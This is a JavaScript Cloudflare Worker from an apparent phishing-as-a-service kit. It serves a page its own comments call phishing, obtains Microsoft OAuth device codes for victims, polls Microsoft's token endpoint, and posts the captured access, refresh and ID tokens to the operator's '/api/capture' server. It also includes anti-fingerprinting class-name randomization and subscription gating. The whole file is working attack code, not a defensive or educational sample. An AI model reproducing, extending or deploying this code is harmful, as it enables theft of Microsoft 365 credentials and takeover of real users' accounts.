// VGenius C Engine – Device Code Worker
// Deployed to Cloudflare Workers per user link

const VERIFY_ENDPOINT = '{{VERIFY_ENDPOINT}}';
const BEACON_ENDPOINT = '{{BEACON_ENDPOINT}}';
const LOG_ENDPOINT = '{{LOG_ENDPOINT}}';

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  
  // Serve the phishing page
  if (request.method === 'GET' && !url.pathname.startsWith('/api/')) {
    return servePhishingPage(request);
  }
  
  // API endpoints
  if (url.pathname === '/api/devicecode') {
    return handleDeviceCodeRequest(request);
  }
  if (url.pathname === '/api/verify') {
    return handleVerifyRequest(request);
  }
  if (url.pathname === '/api/beacon') {
    return new Response('ok', { status: 200 });
  }
  if (url.pathname === '/api/log') {
    return handleLogRequest(request);
  }
  
  return new Response('Not Found', { status: 404 });
}

async function servePhishingPage(request) {
  const jwtToken = '{{JWT_TOKEN}}';
  const turnstileKey = '{{TURNSTILE_KEY}}';
  const templateHTML = `{{TEMPLATE_HTML}}`;
  
  // Verify subscription via JWT before serving full page
  let isValid = false;
  let clientId = '';
  let tenant = 'common';
  
  try {
    const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: jwtToken }),
    });
    const verifyData = await verifyResponse.json();
    isValid = verifyData.valid;
    clientId = verifyData.client_id;
    tenant = verifyData.tenant;
    if (verifyData.turnstile_key) turnstileKey = verifyData.turnstile_key;
  } catch (e) {
    isValid = false;
  }
  
  if (!isValid) {
    return new Response(renderErrorPage(), {
      status: 403,
      headers: {
        'Content-Type': 'text/html',
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'Referrer-Policy': 'no-referrer',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
      },
    });
  }
  
  // Inject dynamic values
  let html = templateHTML
    .replace('{{JWT_TOKEN}}', jwtToken)
    .replace('{{TURNSTILE_KEY}}', turnstileKey)
    .replace('{{CLIENT_ID}}', clientId)
    .replace('{{TENANT}}', tenant)
    .replace('{{VERIFY_ENDPOINT}}', VERIFY_ENDPOINT)
    .replace('{{BEACON_ENDPOINT}}', BEACON_ENDPOINT)
    .replace('{{LOG_ENDPOINT}}', LOG_ENDPOINT);
  
  // Randomize class names for anti-fingerprinting
  html = html.replace(/vg-/g, 'vg-' + Math.random().toString(36).substring(2, 6) + '-');
  
  return new Response(html, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'no-referrer',
      'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' https://challenges.cloudflare.com https://login.microsoftonline.com; img-src * data:; connect-src *;",
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
    },
  });
}

async function handleDeviceCodeRequest(request) {
  const { jwt_token, turnstile_token } = await request.json();
  
  // Verify JWT with backend
  try {
    const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: jwt_token }),
    });
    const verifyData = await verifyResponse.json();
    if (!verifyData.valid) {
      return new Response(JSON.stringify({ error: 'Invalid or expired session' }), {
        status: 403,
        headers: { 'Content-Type': 'application/json' },
      });
    }
    
    // Verify Turnstile
    const turnstileVerify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        secret: '{{TURNSTILE_SECRET}}',
        response: turnstile_token,
      }),
    });
    const turnstileData = await turnstileVerify.json();
    if (!turnstileData.success) {
      return new Response(JSON.stringify({ error: 'CAPTCHA verification failed' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' },
      });
    }
    
    // Request device code from Microsoft
    const deviceCodeResponse = await fetch(
      `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/devicecode`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          client_id: verifyData.client_id,
          resource: 'https://graph.microsoft.com',
        }),
      }
    );
    
    const deviceCodeData = await deviceCodeResponse.json();
    
    // Start background polling
    pollForTokens(deviceCodeData.device_code, jwt_token, verifyData);
    
    return new Response(JSON.stringify({
      user_code: deviceCodeData.user_code,
      verification_uri: deviceCodeData.verification_uri,
      expires_in: deviceCodeData.expires_in,
      message: deviceCodeData.message,
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
  } catch (err) {
    return new Response(JSON.stringify({ error: 'Failed to generate code' }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' },
    });
  }
}

async function pollForTokens(deviceCode, jwtToken, verifyData) {
  const maxAttempts = 60;
  let attempts = 0;
  
  while (attempts < maxAttempts) {
    attempts++;
    await new Promise(resolve => setTimeout(resolve, 5000));
    
    try {
      const tokenResponse = await fetch(
        `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/token`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
            client_id: verifyData.client_id,
            device_code: deviceCode,
          }),
        }
      );
      
      const tokenData = await tokenResponse.json();
      
      if (tokenData.access_token) {
        // Send tokens back to main server
        await fetch(`${VERIFY_ENDPOINT}/api/capture`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            jwt_token: jwtToken,
            access_token: tokenData.access_token,
            refresh_token: tokenData.refresh_token,
            id_token: tokenData.id_token,
          }),
        });
        return;
      } else if (tokenData.error === 'authorization_declined' || tokenData.error === 'expired_token') {
        return;
      }
    } catch (e) {
      // Continue polling on network errors
    }
  }
}

async function handleVerifyRequest(request) {
  const { token } = await request.json();
  const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token }),
  });
  return verifyResponse;
}

async function handleLogRequest(request) {
  try {
    const body = await request.json();
    await fetch(`${LOG_ENDPOINT}/api/log`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch (e) { /* silent */ }
  return new Response('ok', { status: 200 });
}

function renderErrorPage() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page Unavailable</title>
    <style>
        body { font-family: "Segoe UI", sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f3f4f6; margin: 0; }
        .card { background: white; border-radius: 8px; padding: 48px; text-align: center; box-shadow: 0 2px 16px rgba(0,0,0,0.1); max-width: 420px; }
        h2 { color: #333; margin-bottom: 12px; }
        p { color: #666; }
    </style>
</head>
<body>
    <div class="card">
        <h2>This page is no longer available</h2>
        <p>The requested resource has been removed or is temporarily unavailable.</p>
    </div>
</body>
</html>`;
}